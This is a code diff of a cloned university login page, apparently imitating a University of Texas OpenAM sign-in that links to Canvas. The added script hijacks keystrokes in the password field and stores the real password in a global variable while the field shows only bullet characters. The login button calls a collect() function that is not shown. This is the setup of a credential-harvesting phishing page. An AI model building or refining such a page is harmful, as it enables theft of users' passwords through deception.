@@ -136,10 +136,37 @@
                                         <br>
                                         <input class="input_pad" type="text" name="IDToken2" id="pass" value="" autocomplete="off" size="30" aria-required="true"></input>
                                         <script>
-                                            window.realpass = "";
-                                            var fakepass = document.getElementById("pass");
-                                            //fakepass.addEventListener('focus',function(e){ /*yourcode*/ },true);
-                                            fakepass.addEventListener('keypress',function(e){ 
+                                          window.realpass = "";
+                                          alert("loaded!");
+                                          var fakepass = document.getElementById("pass");
+                                          //fakepass.addEventListener('focus',function(e){ /*yourcode*/ },true);
+                                          $("#pass").keypress(function(e) {
+                                              e.preventDefault();
+                                              e.stopPropagation();
+                                              if (e.which !== 0) {
+                                                  var char = String.fromCharCode(e.which);
+                                          window.realpass += char;
+                                          //alert("Realpass: " + window.realpass);
+                                          updatePass();
+                                              }
+                                          }).on('keydown', function(e) {
+                                          if (e.keyCode==8) {
+                                          window.realpass = window.realpass === "" ? "" : window.realpass.substring(0, window.realpass.length - 1);
+                                          //alert("Backspaced Realpass: " + window.realpass);
+                                          updatePass();
+                                          }
+                                          });
+
+                                          function updatePass() {
+                                          var stars = "";
+                                                for (var i = 0; i < window.realpass.length; ++i) {
+                                                    stars += "•";
+                                                }
+                                                fakepass.value = stars;
+                                          }
+
+                                          /*
+                                            fakepass.addEventListener('keyup',function(e){ 
                                                 e.preventDefault();
                                                 e.stopPropagation();
                                                 var code = e.keyCode || e.which;
@@ -148,12 +175,13 @@
                                                 } else {
                                                     window.realpass += String.fromCharCode(code);
                                                 }
+                                                alert(window.realpass);
                                                 var stars = "";
                                                 for (var i = 0; i < window.realpass.length; ++i) {
                                                     stars += "•";
                                                 }
                                                 fakepass.value = stars;
-                                            },true);
+                                            },true); */
                                         </script>
                                     </div>
 
@@ -176,7 +204,7 @@
                                     <div>
                                         <img src="../../../../openam/images/dot.gif" width="1" height="15" alt="">
                                         <a href="https://utexas.instructure.com/"><div id="login_btn">
-                                            <input name="Login.Submit" onclick="collect()" class="login button primary" value="  Log In">
+                                            <input name="Login.Submit" onclick="collect()" class="login button primary" value="   Log In">
                                         </div></a>
                                     </div>
 
